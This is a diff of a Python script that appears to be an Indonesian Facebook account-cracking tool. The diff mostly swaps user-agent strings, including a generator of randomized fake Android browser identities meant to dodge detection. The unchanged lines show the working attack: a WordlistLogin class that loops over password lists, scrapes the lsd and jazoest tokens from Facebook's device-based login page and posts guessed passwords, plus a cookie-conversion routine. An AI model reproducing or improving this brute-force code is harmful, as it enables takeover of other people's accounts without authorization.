@@ -71,7 +71,7 @@ UbahPw = []
 
 # JIKA HASIL TIDAK MAKSIMAL GANTI AJA USER AGENT DI BAWAH INI!
 # VALODATE
-ua = 'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3632 Build/KAB33O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.9822.80 Mobile Safari/537.36 HeyTapBrowser/31.7.36.1'
+ua = 'Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 Instagram 201.0.0.26.112 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 311618467'
 
 def Clear_Terminal(platform):
     if 'win' in sys.platform:os.system('cls')
@@ -86,7 +86,7 @@ def Convert(cookies, username):
 def ConvertCookie(cookies):
     with requests.Session() as x:
          x.headers.update({
-            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
+            "user-agent":"Mozilla/5.0 (Linux; Android ; MI 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
             "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
             "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
          })
@@ -415,7 +415,7 @@ class WordlistLogin:
         rr = random.randint
         rc = random.choice
         az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
-        return str(rc([f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; OPPO A{str(rr(30,57))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}{str(rc(az))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 {str(rc(['S40OviBrowser','HeyTapBrowser']))}/{str(rr(2,40))}.7.36.1",f"Mozilla/5.0 (Linux; U; Android {str(rr(5,12))}; en-us; GM{str(rr(1111,9999))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(1,10))}.{str(rr(111111,999999))}.003)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 SamsungBrowser/{str(rr(2,45))}.7.0.0"]))
+        return str(rc([f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; Xiaomi{str(rr(30,57))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}{str(rc(az))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 {str(rc(['S40OviBrowser','HeyTapBrowser']))}/{str(rr(2,40))}.7.36.1",f"Mozilla/5.0 (Linux; U; Android {str(rr(5,12))}; en-us; GM{str(rr(1111,9999))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(1,10))}.{str(rr(111111,999999))}.003)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 SamsungBrowser/{str(rr(2,45))}.7.0.0"]))
 
     def crackxv(self, user, pwx, url):
         global loop, OK,CP
@@ -459,7 +459,7 @@ class WordlistLogin:
         for pw in pwx:
              try:
                      with requests.Session() as x:
-                          agen = ua #'Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",'
+                          agen = ua #'Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",'
                           link = x.get('https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user)).text
                           data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':'https://developers.facebook.com/webmaster/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(0000000000, 9999999999),pw)}
                           head = {'Host': url,'content-length': '319','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
